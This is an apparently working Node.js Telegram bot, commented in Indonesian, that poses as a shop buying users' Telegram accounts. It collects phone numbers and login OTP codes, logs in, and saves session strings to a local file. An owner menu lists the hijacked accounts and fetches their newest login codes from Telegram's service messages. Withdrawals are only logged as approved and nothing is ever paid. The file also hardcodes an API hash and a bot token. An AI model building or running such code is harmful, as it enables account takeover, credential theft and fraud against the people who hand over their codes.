const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('gramjs');
const { StringSession } = require('gramjs/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8510861119:AAHvf4n2QUAFY_JEJUDeTHFsXH3zxiy2hAY';
const logChannel = '-1003521158263';
const ownerId = 12345678; // <-- GANTI DENGAN ID TELEGRAM KAMU

const bot = new Telegraf(botToken);
const DB_FILE = './sessions.json';

// --- DATABASE HANDLER ---
// Fungsi untuk membaca dan menulis data ke file agar tidak hilang saat restart
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [] }));

const getData = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userSessions = {}; // Penampung temporary state user

// --- KEYBOARD HELPER ---
const mainMenu = () => Markup.inlineKeyboard([
    [Markup.button.callback('🛒 Jual Akun Telegram', 'jual_akun')],
    [Markup.button.callback('👤 Profile', 'profile'), Markup.button.callback('💸 Withdraw', 'withdraw')],
    [Markup.button.callback('👑 Owner Menu', 'owner_menu')]
]);

// --- BOT COMMANDS ---
bot.start((ctx) => {
    ctx.reply(
        `✨ **Selamat Datang di Toko Akun** ✨\n\n` +
        `Dapatkan saldo instant dengan menjual akun Telegram Anda.\n` +
        `Pastikan akun dalam kondisi bersih untuk harga maksimal!`,
        mainMenu()
    );
});

// --- PROSES JUAL AKUN & OTP ---
bot.action('jual_akun', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.reply('📲 Masukkan nomor Telegram (Format: 628xxx):');
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];

    if (!state) return;

    // STEP 1: INPUT NOMOR
    if (state.step === 'input_phone') {
        state.phone = text.replace(/[^0-9]/g, '');
        ctx.reply(`⏳ Menghubungi server Telegram untuk nomor ${state.phone}...`);
        
        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            state.client = client;
            await client.connect();
            
            // Minta Kode OTP
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, state.phone);
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            
            ctx.reply('📩 Kode OTP terkirim! Masukkan kode dengan spasi.\nContoh: 1 2 3 4 5');
        } catch (err) {
            ctx.reply('❌ Error: ' + err.message);
            delete userSessions[userId];
        }
    }

    // STEP 2: INPUT OTP & VALIDASI SESI
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        ctx.reply('⚙️ Menverifikasi akun...');

        try {
            const client = state.client;
            await client.signIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp,
            });

            const sessionStr = client.session.save();
            const auths = await client.invoke(new Api.account.GetAuthorizations());
            const isClean = auths.authorizations.length === 1;

            // Simpan ke session.json
            const db = getData();
            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                seller: ctx.from.username || ctx.from.id,
                date: new Date().toLocaleString(),
                clean: isClean
            });
            saveData(db);

            if (isClean) {
                ctx.reply('✅ Sukses! Akun bersih (hanya 1 perangkat). Saldo bertambah Full!');
            } else {
                ctx.reply('⚠️ Sukses! Namun terdeteksi ' + auths.authorizations.length + ' perangkat. Silahkan logout perangkat lain agar saldo cair.');
            }
            
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ Gagal Login: ' + err.message);
        }
        delete userSessions[userId];
    }

    // STEP 3: WITHDRAW
    else if (state.step === 'input_wd') {
        ctx.reply('✅ Penarikan sedang diproses oleh admin.');
        bot.telegram.sendMessage(logChannel, 
            `🔔 **NOTIFIKASI WITHDRAW**\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 User: @${ctx.from.username || ctx.from.id}\n` +
            `📝 Detail: ${text}\n` +
            `💰 Status: Berhasil Disetujui\n` +
            `━━━━━━━━━━━━━━━━━━`
        );
        delete userSessions[userId];
    }
});

// --- PROFILE & WITHDRAW ---
bot.action('profile', (ctx) => {
    ctx.reply(`👤 **Profil Pengguna**\n\nID: \`${ctx.from.id}\`\nStatus: Aktif\nSaldo: Rp 0 (Selesaikan penjualan)`);
});

bot.action('withdraw', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.reply('💸 **Menu Penarikan**\n\nMasukkan nomor DANA/OVO dan jumlah saldo.\nContoh: DANA 08xxx - 50000');
});

// --- OWNER MENU & PAGINATION ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('Akses Ditolak!');
    ctx.reply('👑 **Admin Panel**', Markup.inlineKeyboard([
        [Markup.button.callback('📑 Daftar Akun Terjual', 'list_0')],
        [Markup.button.callback('📢 Broadcast', 'bc')]
    ]));
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const db = getData();
    const accounts = db.accounts;
    
    const start = page * 5;
    const end = start + 5;
    const current = accounts.slice(start, end);

    const buttons = current.map((acc, i) => [
        Markup.button.callback(`📞 ${acc.phone}`, `detail_${start + i}`)
    ]);

    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️', `list_${page - 1}`));
    if (end < accounts.length) nav.push(Markup.button.callback('➡️', `list_${page + 1}`));
    if (nav.length) buttons.push(nav);
    
    buttons.push([Markup.button.callback('🔙 Kembali', 'owner_menu')]);
    ctx.editMessageText(`Daftar Akun (Hal ${page + 1})`, Markup.inlineKeyboard(buttons));
});

// DETAIL NOMOR & CEK OTP TERBARU
bot.action(/^detail_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const acc = getData().accounts[index];
    
    ctx.reply(
        `📄 **Detail Akun**\n\n` +
        `Nomor: ${acc.phone}\n` +
        `Penjual: @${acc.seller}\n` +
        `Tanggal: ${acc.date}\n` +
        `Sesi: \`${acc.session.substring(0, 15)}...\``,
        Markup.inlineKeyboard([
            [Markup.button.callback('📩 Cek OTP @Telegram', `otp_${index}`)],
            [Markup.button.callback('🔙 Kembali', 'list_0')]
        ])
    );
});

bot.action(/^otp_(\d+)$/, async (ctx) => {
    const index = parseInt(ctx.match[1]);
    const acc = getData().accounts[index];
    ctx.answerCbQuery('Sedang mengambil OTP...');
    
    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const messages = await client.getMessages(777000, { limit: 1 }); // 777000 adalah ID @Telegram
        ctx.reply(`📩 **Pesan Terakhir @Telegram (${acc.phone}):**\n\n${messages[0].message}`);
        await client.disconnect();
    } catch (e) {
        ctx.reply('❌ Gagal ambil OTP: ' + e.message);
    }
});

bot.launch();
console.log('🚀 Bot Jual Akun telah aktif!');
